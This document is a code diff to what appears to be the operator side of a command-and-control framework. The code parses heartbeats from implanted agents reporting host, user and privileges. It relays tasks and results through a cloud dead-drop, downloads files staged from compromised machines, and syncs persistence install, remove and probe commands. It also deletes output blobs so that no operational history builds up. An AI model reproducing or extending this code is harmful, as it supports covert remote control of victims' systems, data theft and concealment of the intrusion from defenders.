@@ -27,7 +27,7 @@ def _parse_heartbeat(text: str) -> dict:
     p    = text.split("|")
     keys = ["timestamp", "host", "user", "ip", "os", "privs",
             "agent_start_cwd", "op_cwd", "ip_ext", "pid", "process", "domain", "blob_path",
-            "blob_tried", "seq", "next_hb_at"]
+            "blob_tried", "seq", "next_hb_at", "p2p_link_events"]
     return {keys[i]: p[i] if i < len(p) else "" for i in range(len(keys))}
 
 
@@ -212,9 +212,7 @@ class HeartbeatMonitor(threading.Thread):
 
 
     def _bootstrap_server_epoch(self, sess, raw: bytes):
-        from providers._epoch import (
-            bootstrap_epoch_server, EpochState as _EpochState,
-        )
+        from providers._epoch import bootstrap_epoch_server
         import struct as _struct
         if len(raw) < 37:
             return None
@@ -230,7 +228,7 @@ class HeartbeatMonitor(threading.Thread):
             try:
                 st = bootstrap_epoch_server(prekey_priv, agent_eph_pub, session_key, agent_id)
                 from providers._epoch import decrypt_message_v2 as _dec_test
-                test = _dec_test(raw, st, agent_id)
+                test = _dec_test(raw, st, agent_id, _bootstrap=True)
                 if test is not None:
                     sess.save_epoch_state(st)
                     return st
@@ -332,9 +330,11 @@ def _initial_hb_check(sess: Session):
 class AsyncPoller(threading.Thread):
     def __init__(self, session: Session, baseline: str, display_cmd: str, cmd_id: str,
                  session_token: str = "", timeout_override: Optional[float] = None,
-                 silent_timeout: bool = False):
+                 silent_timeout: bool = False,
+                 history_session: "Optional[Session]" = None):
         super().__init__(daemon=True, name=f"poll-{session.id}-{cmd_id[:4]}")
         self.session       = session
+        self.hist_session  = history_session or session
         self.baseline      = baseline
         self.display_cmd   = display_cmd
         self.cmd_id        = cmd_id
@@ -349,6 +349,7 @@ class AsyncPoller(threading.Thread):
 
     def run(self):
         sess  = self.session
+        hist  = self.hist_session
         start = time.time()
         poll_timeout = self._timeout_override if self._timeout_override is not None else sess.poll_timeout
         try:
@@ -373,7 +374,7 @@ class AsyncPoller(threading.Thread):
                                 sess.transport.upload(sess.profile.input_path, b"MZ")
                             except Exception as e:
                                 _n_warn(f"[{self.cmd_id}] could not reset input: {e}")
-                            sess.hist.update_response("ERROR: timeout — no response from agent")
+                            hist.hist.update_response("ERROR: timeout — no response from agent")
                             _n_output(self.cmd_id, "ERROR: timeout — no response from agent")
                     return
 
@@ -419,107 +420,105 @@ class AsyncPoller(threading.Thread):
                     if cwd:
                         sess.state.update(remote_cwd=cwd)
 
-                        # HIGH-9: delete output file from cloud after reading — prevent
-                        # operational history accumulation on the dead-drop storage.
-                        try:
-                            sess.transport.delete(sess.profile.output_path)
-                        except Exception as e:
-                            _n_warn(f"[{self.cmd_id}] could not delete output blob: {e}")
+                    # HIGH-9: delete output file from cloud after reading
+                    try:
+                        sess.transport.delete(sess.profile.output_path)
+                    except Exception as e:
+                        _n_warn(f"[{self.cmd_id}] could not delete output blob: {e}")
 
-                        for art in artifacts:
-                            op   = art.get("op", "")
-                            kind = art.get("type", "")
-                            path = art.get("path", "")
-                            if op == "add" and kind and path:
-                                sess.hist.record_artifact(kind, path)
-                                _n_info(f"[artifact] +{kind}: {path}")
-                            elif op == "remove" and kind and path:
-                                sess.hist.remove_artifact(kind, path)
-                                _n_info(f"[artifact] -{kind}: {path}")
-                        if artifacts:
-                            _n_ul_confirmed(sess.id)
+                    for art in artifacts:
+                        op   = art.get("op", "")
+                        kind = art.get("type", "")
+                        path = art.get("path", "")
+                        if op == "add" and kind and path:
+                            hist.hist.record_artifact(kind, path)
+                            _n_info(f"[artifact] +{kind}: {path}")
+                        elif op == "remove" and kind and path:
+                            hist.hist.remove_artifact(kind, path)
+                            _n_info(f"[artifact] -{kind}: {path}")
+                    if artifacts:
+                        _n_ul_confirmed(hist.id)
 
-                        self.result = output
+                    self.result = output
 
-                        # Auto-save for /download — uses staging_path field, not raw output
-                        if self.cmd_id in sess.pending_dl:
-                            filename, local_dest = sess.pending_dl.pop(self.cmd_id)
-                            if status == "error" or not staging_path:
-                                err_msg = output or "ERROR: download failed"
-                                _n_err(f"[{self.cmd_id}] {err_msg}")
-                                sess.hist.update_response(err_msg)
-                                _n_output(self.cmd_id, err_msg)
-                            else:
-                                file_data = sess.transport.download(staging_path)
-                                if file_data:
-                                    if local_dest:
-                                        dest = Path(local_dest)
-                                        if local_dest.endswith("/") or Path(local_dest).is_dir():
-                                            dest = dest / filename
-                                    else:
-                                        sess_dl = DOWNLOADS_DIR / sess.id
-                                        sess_dl.mkdir(parents=True, exist_ok=True)
-                                        dest = sess_dl / filename
-                                    dest.parent.mkdir(parents=True, exist_ok=True)
-                                    dest.write_bytes(file_data)
-                                    sess.transport.delete(staging_path)
-                                    msg = f"saved: {dest}  ({len(file_data):,} bytes)"
-                                    _n_ok(f"[{self.cmd_id}] {msg}")
-                                    sess.hist.update_response(msg)
-                                    _n_output(self.cmd_id, f"File {filename} ({len(file_data):,} bytes) downloaded — check Artifacts")
+                    # Auto-save for /download — uses staging_path field, not raw output
+                    if self.cmd_id in sess.pending_dl:
+                        filename, local_dest = sess.pending_dl.pop(self.cmd_id)
+                        if status == "error" or not staging_path:
+                            err_msg = output or "ERROR: download failed"
+                            _n_err(f"[{self.cmd_id}] {err_msg}")
+                            hist.hist.update_response(err_msg)
+                            _n_output(self.cmd_id, err_msg)
+                        else:
+                            file_data = sess.transport.download(staging_path)
+                            if file_data:
+                                if local_dest:
+                                    dest = Path(local_dest)
+                                    if local_dest.endswith("/") or Path(local_dest).is_dir():
+                                        dest = dest / filename
                                 else:
-                                    msg = "ERROR: staging download failed"
-                                    _n_err(f"[{self.cmd_id}] staging download failed")
-                                    sess.hist.update_response(msg)
-                                    _n_output(self.cmd_id, msg)
-                            return
-
-                        if self.cmd_id in sess.pending_ul:
-                            ul_info = sess.pending_ul.pop(self.cmd_id)
-                            if status == "ok":
-                                _save_ul_record(sess.id, ul_info, sess.hist._log_dir)
-                                _n_ul_confirmed(sess.id)
-                                # Delete staging file from cloud after confirmed delivery
-                                _stg = ul_info.get("staging_path", "")
-                                if _stg:
-                                    try:
-                                        sess.transport.delete(_stg)
-                                    except Exception:
-                                        pass
-
-                        staging_files = resp.get("staging_files", [])
-                        if staging_files:
-                            sess_dl = DOWNLOADS_DIR / sess.id
-                            sess_dl.mkdir(parents=True, exist_ok=True)
-                            for sf in staging_files:
-                                cp = sf.get("cloud_path", "")
-                                fn = sf.get("filename", cp.rsplit("/", 1)[-1] if cp else "unknown")
-                                sp = sf.get("source_path", "") or cp
-                                if not cp:
-                                    continue
-                                try:
-                                    data = sess.transport.download(cp)
-                                    if data:
-                                        dest = sess_dl / fn
-                                        dest.write_bytes(data)
-                                        sess.transport.delete(cp)
-                                        sess.hist.log_download(self.cmd_id, sp, str(dest), len(data))
-                                        _n_ok(f"[{self.cmd_id}] {fn} ({len(data):,} bytes) saved")
-                                    else:
-                                        _n_warn(f"[{self.cmd_id}] staging download failed for {fn}")
-                                except Exception as exc:
-                                    _n_warn(f"[{self.cmd_id}] staging pull error for {fn}: {exc}")
-
-                        sess.hist.update_response(self.result)
-                        _n_output(self.cmd_id, self.result)
-                        if "/persist check" in self.display_cmd:
-                            _sync_persist_check(sess, self.result)
-                        if "/persist probe" in self.display_cmd and "PROBE:" in self.result:
-                            _sync_persist_probe(sess, self.result)
-                        _pm = re.search(r'/persist (install|remove|status) (\S+)', self.display_cmd)
-                        if _pm:
-                            _sync_persist_op(sess, _pm.group(1), _pm.group(2), self.result)
+                                    sess_dl = DOWNLOADS_DIR / hist.id
+                                    sess_dl.mkdir(parents=True, exist_ok=True)
+                                    dest = sess_dl / filename
+                                dest.parent.mkdir(parents=True, exist_ok=True)
+                                dest.write_bytes(file_data)
+                                sess.transport.delete(staging_path)
+                                msg = f"saved: {dest}  ({len(file_data):,} bytes)"
+                                _n_ok(f"[{self.cmd_id}] {msg}")
+                                hist.hist.update_response(msg)
+                                _n_output(self.cmd_id, f"File {filename} ({len(file_data):,} bytes) downloaded — check Artifacts")
+                            else:
+                                msg = "ERROR: staging download failed"
+                                _n_err(f"[{self.cmd_id}] staging download failed")
+                                hist.hist.update_response(msg)
+                                _n_output(self.cmd_id, msg)
                         return
+
+                    if self.cmd_id in sess.pending_ul:
+                        ul_info = sess.pending_ul.pop(self.cmd_id)
+                        if status == "ok":
+                            _save_ul_record(hist.id, ul_info, hist.hist._log_dir)
+                            _n_ul_confirmed(hist.id)
+                            _stg = ul_info.get("staging_path", "")
+                            if _stg:
+                                try:
+                                    sess.transport.delete(_stg)
+                                except Exception:
+                                    pass
+
+                    staging_files = resp.get("staging_files", [])
+                    if staging_files:
+                        sess_dl = DOWNLOADS_DIR / hist.id
+                        sess_dl.mkdir(parents=True, exist_ok=True)
+                        for sf in staging_files:
+                            cp = sf.get("cloud_path", "")
+                            fn = sf.get("filename", cp.rsplit("/", 1)[-1] if cp else "unknown")
+                            sp = sf.get("source_path", "") or cp
+                            if not cp:
+                                continue
+                            try:
+                                data = sess.transport.download(cp)
+                                if data:
+                                    dest = sess_dl / fn
+                                    dest.write_bytes(data)
+                                    sess.transport.delete(cp)
+                                    hist.hist.log_download(self.cmd_id, sp, str(dest), len(data))
+                                    _n_ok(f"[{self.cmd_id}] {fn} ({len(data):,} bytes) saved")
+                                else:
+                                    _n_warn(f"[{self.cmd_id}] staging download failed for {fn}")
+                            except Exception as exc:
+                                _n_warn(f"[{self.cmd_id}] staging pull error for {fn}: {exc}")
+
+                    hist.hist.update_response(self.result)
+                    _n_output(self.cmd_id, self.result)
+                    if "/persist check" in self.display_cmd:
+                        _sync_persist_check(hist, self.result)
+                    if "/persist probe" in self.display_cmd and "PROBE:" in self.result:
+                        _sync_persist_probe(hist, self.result)
+                    _pm = re.search(r'/persist (install|remove|status) (\S+)', self.display_cmd)
+                    if _pm:
+                        _sync_persist_op(hist, _pm.group(1), _pm.group(2), self.result)
+                    return
 
                 self._stop.wait(sess.poll_interval)
         finally:
@@ -528,7 +527,8 @@ class AsyncPoller(threading.Thread):
 
 def send_async(session: Session, task_json: str, display: str, cmd_id: str = "",
                operator: str = "", fire_and_forget: bool = False,
-               on_upload_failure: "Optional[Callable[[str], None]]" = None) -> str:
+               on_upload_failure: "Optional[Callable[[str], None]]" = None,
+               history_session: "Optional[Session]" = None) -> str:
     if not cmd_id:
         cmd_id = os.urandom(8).hex()
 
@@ -582,12 +582,13 @@ def send_async(session: Session, task_json: str, display: str, cmd_id: str = "",
                 on_upload_failure(cmd_id)
             return
 
-        session.hist.add(display, cmd_id, operator=operator)
+        _hist_session = history_session or session
+        _hist_session.hist.add(display, cmd_id, operator=operator)
         _n_ok(f"[{cmd_id}] sent")
 
         if fire_and_forget:
             # No response expected — resolve pending immediately after upload.
-            session.hist.update_response("(no response expected)")
+            _hist_session.hist.update_response("(no response expected)")
             _n_output(cmd_id, "(no response expected)")
             with session.poller_lock:
                 if session.poller:
@@ -595,7 +596,8 @@ def send_async(session: Session, task_json: str, display: str, cmd_id: str = "",
             return
 
         with session.poller_lock:
-            p = AsyncPoller(session, captured_baseline, display, cmd_id, session_token)
+            p = AsyncPoller(session, captured_baseline, display, cmd_id, session_token,
+                            history_session=history_session)
             session.poller = p
         p.start()
 
